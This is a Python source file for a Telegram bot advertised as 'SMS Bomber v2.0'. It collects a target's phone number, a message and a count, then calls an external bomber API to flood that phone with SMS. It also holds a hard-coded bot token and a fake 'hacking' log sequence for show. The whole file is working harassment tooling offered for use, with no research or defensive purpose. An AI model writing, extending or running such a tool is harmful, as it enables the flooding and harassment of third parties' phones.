import requests
import os
import sys
import time
import random
import telebot
from telebot import types

# ============ CONFIG ============
API_URL = "https://anishexploits.com/bomber/custom-sms.php"
OWNER   = "SUMIT"
TELEGRAM_BOT_TOKEN = "9269564441:AAH91b6RuH4IxRCI7UW GKraayNfL7jC4c1Q"

bot = telebot.TeleBot(TELEGRAM_BOT_TOKEN)

# Temporary dictionary to store user attack states step-by-step
user_states = {}

# ============ UTILS ============
def fake_hack_sequence():
    logs = [
        "Bypassing firewall...",
        "Injecting payload...",
        "Connecting to server...",
        "Decrypting API key...",
        "Verifying credentials...",
        "Escalating privileges...",
        "Establishing secure tunnel...",
        "Spoofing MAC address...",
        "Routing through 7 proxies...",
        "Access granted ✔",
    ]
    for log in logs:
        time.sleep(0.2)

# ============ KEYBOARD ============
def main_menu_keyboard():
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    btn_attack = types.KeyboardButton("🚀 Start Attack")
    btn_about = types.KeyboardButton("👤 About")
    markup.add(btn_attack, btn_about)
    return markup

# ============ TELEGRAM HANDLERS ============

@bot.message_handler(commands=['start'])
def send_welcome(message):
    welcome_text = (
        f"⚡ *THE SMS BOMBER v2.0* ⚡\n"
        f"Powered by @{OWNER}\n\n"
        f"Welcome, {message.from_user.first_name}!\n"
        f"Please use the buttons below or send commands to start."
    )
    bot.send_message(message.chat.id, welcome_text, parse_mode="Markdown", reply_markup=main_menu_keyboard())

@bot.message_handler(func=lambda message: message.text == "👤 About" or message.text.lower() == "/about")
def handle_about(message):
    about_text = (
        f"👤 *Name*: {OWNER} (Exclusive {OWNER})\n"
        f"💻 *Role*: Ethical Hacker\n"
        f"🛠 *Tool*: SMS Bomber v2.0\n"
        f"⚡ *Status*: ONLINE\n"
        f"🔥 *Motto*: Hack the world, ethically."
    )
    bot.reply_to(message, about_text, parse_mode="Markdown")

# Step 1: Trigger Attack via Button or Command
@bot.message_handler(func=lambda message: message.text == "🚀 Start Attack" or message.text.lower() == "/attack")
def start_attack_flow(message):
    user_states[message.chat.id] = {"step": "waiting_phone"}
    bot.reply_to(message, "📱 Please send the target **Phone Number** (Digits only, min 10):", parse_mode="Markdown")

# Step 2: Handle Multi-step Inputs
@bot.message_handler(func=lambda message: message.chat.id in user_states)
def process_attack_steps(message):
    chat_id = message.chat.id
    state = user_states[chat_id].get("step")

    if state == "waiting_phone":
        phone = message.text.strip()
        if not phone.isdigit() or len(phone) < 10:
            bot.reply_to(message, "❌ Invalid number! Please enter a valid phone number with at least 10 digits.")
            return
        
        user_states[chat_id]["phone"] = phone
        user_states[chat_id]["step"] = "waiting_sms"
        bot.reply_to(message, "💬 Now please type and send the **Message** you want to deliver:")

    elif state == "waiting_sms":
        sms = message.text.strip()
        if not sms:
            bot.reply_to(message, "❌ Message cannot be empty. Please enter again:")
            return

        user_states[chat_id]["sms"] = sms
        user_states[chat_id]["step"] = "waiting_count"
        bot.reply_to(message, "🔢 Now please enter the **SMS Count (Quantity)** (e.g., 5, 10):")

    elif state == "waiting_count":
        count_in = message.text.strip()
        count = int(count_in) if count_in.isdigit() and int(count_in) > 0 else 1

        phone = user_states[chat_id]["phone"]
        sms = user_states[chat_id]["sms"]
        
        # Clear state
        del user_states[chat_id]

        bot.reply_to(message, f"⚡ Launching attack on target {phone}...")
        fake_hack_sequence()

        params = {"phone": phone, "sms": sms, "count": count}
        try:
            r = requests.get(API_URL, params=params, timeout=60)
            data = r.json()

            if data.get("status") == "success":
                res = data.get("result", {})
                sent    = res.get("sent", 0)
                failed  = res.get("failed", 0)
                time_ms = res.get("time_ms", 0)
                speed   = res.get("speed", "N/A")

                result_text = (
                    f"✔ *ATTACK SUCCESSFUL*\n\n"
                    f"📤 Sent      : {sent}\n"
                    f"❌ Failed    : {failed}\n"
                    f"⏱  Time      : {time_ms} ms\n"
                    f"⚡ Speed     : {speed}\n\n"
                    f"Target neutralized. Good job, {OWNER}!"
                )
                bot.send_message(chat_id, result_text, parse_mode="Markdown", reply_markup=main_menu_keyboard())
            else:
                msg = data.get("message", str(data))
                code = data.get("code", "?")
                bot.send_message(chat_id, f"❌ Failed ({code}): {msg}", reply_markup=main_menu_keyboard())

        except Exception as e:
            bot.send_message(chat_id, f"❌ Error: {e}", reply_markup=main_menu_keyboard())

# ============ MAIN ============
if __name__ == "__main__":
    print(f"[*] Telegram Bot started as {OWNER}...")
    bot.infinity_polling()
